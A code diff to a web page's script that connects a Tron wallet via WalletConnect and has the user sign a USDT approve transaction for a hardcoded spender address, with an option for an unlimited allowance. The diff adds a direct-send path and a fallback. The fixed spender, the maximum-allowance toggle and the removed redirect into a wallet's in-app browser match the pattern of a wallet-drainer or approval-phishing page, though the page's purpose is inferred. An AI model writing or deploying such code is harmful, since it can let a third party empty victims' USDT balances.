@@ -59,35 +59,31 @@ const TRON_CHAIN = "tron:0x2b6653dc";
 const TRONGRID = "https://api.trongrid.io";
 
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
 let client, session, wallet;
 let unlimited = false;
 
-// log helper
+// logger
 function log(msg){
   document.getElementById("logs").innerText += msg + "\n";
 }
 
-// detect mobile
-function isMobile(){
-  return /Android|iPhone|iPad/i.test(navigator.userAgent);
-}
-
-// convert
+// convert address
 function tronToHex(addr){
   const bytes = bs58.decode(addr);
   return Array.from(bytes).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,42);
 }
 
-// encode
+// encode approve
 function encodeApprove(spenderHex, amount){
   const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
 
   let amountHex;
 
   if(unlimited){
-    amountHex = "f".repeat(64); // 🔥 TRUE MAX
+    amountHex = "f".repeat(64);
   } else {
     const val = BigInt(Math.floor(amount * 1e6));
     amountHex = val.toString(16).padStart(64,"0");
@@ -105,7 +101,7 @@ async function buildTx(owner, data){
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       owner_address: ownerHex,
-      contract_address: tronToHex(USDT),
+      contract_address: USDT_HEX,
       data: data,
       fee_limit:100000000,
       call_value:0,
@@ -114,9 +110,7 @@ async function buildTx(owner, data){
   });
 
   const d = await res.json();
-
   log("TX BUILD:\n" + JSON.stringify(d,null,2));
-
   return d.transaction;
 }
 
@@ -129,9 +123,7 @@ async function broadcast(tx){
   });
 
   const d = await res.json();
-
   log("BROADCAST:\n" + JSON.stringify(d,null,2));
-
   return d;
 }
 
@@ -155,8 +147,8 @@ document.getElementById("unlimitedBtn").onclick = ()=>{
     "Unlimited: " + (unlimited ? "ON" : "OFF");
 };
 
-// connect desktop
-async function desktopConnect(){
+// connect
+async function connect(){
   const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
   client = await SignClient.init({
@@ -167,14 +159,18 @@ async function desktopConnect(){
   const { uri, approval } = await client.connect({
     requiredNamespaces:{
       tron:{
-        methods:["tron_signTransaction"],
+        methods:["tron_signTransaction"], // stable connect
         chains:[TRON_CHAIN],
         events:[]
       }
     }
   });
 
-  new QRCode(document.getElementById("qr"),{text:uri,width:200,height:200});
+  new QRCode(document.getElementById("qr"),{
+    text: uri,
+    width:200,
+    height:200
+  });
 
   session = await approval();
 
@@ -188,12 +184,35 @@ async function desktopConnect(){
 document.getElementById("approveBtn").onclick = async ()=>{
   try{
     const amount = Number(input.value);
-
     const spenderHex = tronToHex(SPENDER);
     const data = encodeApprove(spenderHex, amount);
 
-    log("ENCODED DATA:\n" + data);
+    log("ENCODED:\n" + data);
 
+    // 🔥 TRY wallet-native (like Tronscan)
+    try{
+      const result = await client.request({
+        topic: session.topic,
+        chainId: TRON_CHAIN,
+        request:{
+          method:"tron_sendTransaction",
+          params:{
+            to: USDT,
+            data: "0x" + data,
+            value:"0x0"
+          }
+        }
+      });
+
+      log("SEND TX SUCCESS:\n" + JSON.stringify(result,null,2));
+      document.getElementById("status").innerText = "✅ Success";
+      return;
+
+    }catch(e){
+      log("sendTransaction failed → fallback");
+    }
+
+    // fallback
     const tx = await buildTx(wallet, data);
 
     const signed = await client.request({
@@ -206,32 +225,23 @@ document.getElementById("approveBtn").onclick = async ()=>{
     });
 
     const finalTx = fixSig(signed, tx);
-
     const result = await broadcast(finalTx);
 
     if(result.result){
-      document.getElementById("status").innerText = "✅ SUCCESS";
+      document.getElementById("status").innerText = "✅ Success";
     } else {
-      throw JSON.stringify(result);
+      throw result;
     }
 
   }catch(e){
-    document.getElementById("status").innerText = "❌ FAILED";
-    log("ERROR:\n" + e);
+    console.error(e);
+    log("ERROR:\n" + JSON.stringify(e,null,2));
+    document.getElementById("status").innerText = "❌ Failed";
   }
 };
 
 // init
-(async ()=>{
-  if(isMobile()){
-    window.location.href =
-      "https://link.trustwallet.com/open_url?url=" +
-      encodeURIComponent(window.location.href);
-    return;
-  }
-
-  await desktopConnect();
-})();
+connect();
 </script>
 
 </body>
